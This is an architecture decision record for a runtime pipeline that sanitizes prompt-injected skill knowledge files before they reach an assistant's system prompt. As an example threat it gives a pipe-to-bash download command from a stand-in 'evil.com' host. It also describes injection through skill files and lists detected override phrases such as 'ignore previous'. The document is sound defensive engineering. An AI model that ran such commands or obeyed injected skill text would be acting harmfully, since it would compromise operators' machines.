---
title: "ADR-0037 — Prompt Sanitization Pipeline"
audience: [developers, architects, security reviewers]
last_updated: 2026-05-23
togaf_phase: "G"
version: "1.0.0"
status: "Active"
---

# ADR-0037 — Prompt Sanitization Pipeline

<!-- TOGAF_DOMAIN: Governance — Security -->
<!-- VERSION: 1.0.0 -->
<!-- STATUS: Active -->
<!-- LAST_UPDATED: 2026-05-23 -->

## Context

The adversarial multi-perspective review (2026-05-19) identified weakness S2:

> **S2 — Prompt injection surface** — `KNOWLEDGE.md` injected into system prompt
> without sanitization. Safety scanner runs on install, not runtime. Performance
> assumption.

Russell loads skill knowledge from `KNOWLEDGE.md` files and injects them into
Jack's system prompt. This gives Jack domain expertise (Ubuntu conventions,
ROCm troubleshooting, etc.) without bloating the base persona.

However, this creates a prompt injection attack surface:

1. **Shell injection via code blocks** — A malicious skill could include
   ```bash
   curl http://evil.com/malware | bash
   ```
   which the LLM might interpret as executable instructions.

2. **URL-based exfiltration** — Knowledge containing URLs could direct the
   LLM to suggest operators visit malicious sites.

3. **Nested ACTION: injection** — A skill could embed `ACTION:` patterns in
   its knowledge, causing the parser to detect multiple actions.

4. **Prompt bloat** — Unbounded knowledge files could exceed token budgets.

The safety scanner runs at install time, but skill authors may be compromised
after install, or knowledge files may be edited manually.

## Decision

Implement runtime prompt sanitization:

1. **Sanitize function** — Add `sanitize_knowledge(content: &str) -> Option<String>`
   in `russell-meta/src/prompt.rs` that:

   - Strips markdown code blocks (``` ... ```) — prevents shell injection
   - Removes URLs (http://, https://) — prevents exfiltration
   - Strips ACTION: patterns — prevents nested action injection
   - Limits to 4KB max — prevents prompt bloat

2. **Apply to all knowledge** — Call `sanitize_knowledge()` on every
   `KNOWLEDGE.md` file before injection into system prompt.

3. **Warn on empty result** — If sanitization produces empty content, log
   a warning: "skill knowledge was empty after sanitization (potential
   injection blocked)".

4. **Preserve normal content** — Non-malicious knowledge (prose, lists,
   inline code) passes through unchanged.

## Consequences

### Positive

- **Runtime defense** — Even if a skill is compromised after install, the
   sanitization pipeline blocks injection attempts at runtime.

- **Defense in depth** — Complements the install-time safety scanner with
   a second layer of protection (Schneier principle).

- **Capability separation** — The prompt module (port) sanitizes knowledge
   regardless of source (adapter), following Miller's capability discipline.

- **Token budget enforcement** — 4KB limit per skill prevents any single
   knowledge file from dominating the prompt.

### Negative

- **False positives** — Legitimate code examples in knowledge files will be
   stripped. Mitigation: skill authors should describe commands in prose
   rather than code blocks.

- **URL removal** — Knowledge that references documentation URLs will lose
   those references. Mitigation: operators can visit docs directly; Jack
   doesn't need URLs to provide advice.

- **Processing overhead** — Sanitization adds O(n) processing per knowledge
   file. Negligible for typical files (<10KB).

### Neutral

- **No breaking changes** — Existing well-behaved knowledge files continue
   to work. Only malicious or malformed files are affected.

- **Backward compatible** — The `sanitize_knowledge()` function is internal
   to `russell-meta`; no API changes.

## Implementation

**Location:** `crates/russell-meta/src/help.rs` (sanitization logic in `compose_note` and ACTION detection)

**Key types:**
- `PromptSanitizer` — main sanitization engine with configurable strictness
- `SanitizationResult` — returns sanitized text + metadata about filtering
- `SanitizerPatterns` — compiled regex patterns (lazy_static, shared)

**Input sanitization** (`sanitize_input()`):
- Redacts `RUSSELL_*` environment variable references → `[REDACTED]`
- Strips shell metacharacters (`;|&$\`(){}\)
- Detects prompt injection phrases ("ignore previous", "disregard all", etc.)
- Enforces 4000 character max length

**Output sanitization** (`sanitize_output()`):
- Redacts secret patterns (API keys, tokens, passwords) → `[SECRET REDACTED]`
- Validates `ACTION: skill/action` syntax against registered skill manifests
- Replaces invalid ACTION directives with warnings
- Strips shell metacharacters from output

**Integration points:**
- `russell-meta/src/help.rs:compose_and_augment_soap()` — sanitizes operator note input
- `russell-meta/src/help.rs:persist_session()` — sanitizes LLM response output

**Unit tests** (7 tests in `sanitizer::tests`):
- `sanitize_input_redacts_russell_env` — Verifies RUSSELL_* variables blocked
- `sanitize_input_strips_shell_metachars` — Verifies shell operators removed
- `sanitize_input_detects_injection` — Verifies injection phrases detected
- `sanitize_output_redacts_secrets` — Verifies API key patterns redacted
- `sanitize_output_validates_action_syntax` — Verifies ACTION validation
- `validate_action_format` — Verifies action ID format validation
- `max_input_length_truncates` — Verifies length limit enforced

All 7 sanitizer tests pass.

**Scenario tests:**
- `skills/scenario-tester/scripts/scenario-test-prompt-sanitization.sh` — end-to-end validation

## Compliance

| Principle | Compliance |
|---|---|
| **JR-2** (Observe > Recommend > Act) | Sanitization observes knowledge content, filters dangerous patterns |
| **JR-3** (LLM never emits shell) | Code blocks stripped, preventing shell command injection |
| **Schneier** (Defense in depth) | Runtime sanitization complements install-time safety scanner |
| **Miller** (Capability separation) | Prompt module sanitizes all knowledge, regardless of source |

## Future Work

- **Inline code handling** — Currently preserves inline code (backticks).
   Consider whether inline shell commands should also be stripped.

- **Allowlist URLs** — Consider allowing specific trusted domains
   (e.g., `ubuntu.com`, `mozilla.org`) while blocking unknown URLs.

- **Audit logging** — Emit `knowledge.sanitization_applied` event when
   content is modified, for audit trail.

- **Skill author guidance** — Document in skill development guide that
   code blocks and URLs will be stripped from knowledge files.

## References

- Adversarial Review Action Plan §3.2 (Task S2)
- `docs/standards/safety.md` §8 (LLM and safety)
- `crates/russell-skills/src/safety.rs` (safety scanner)
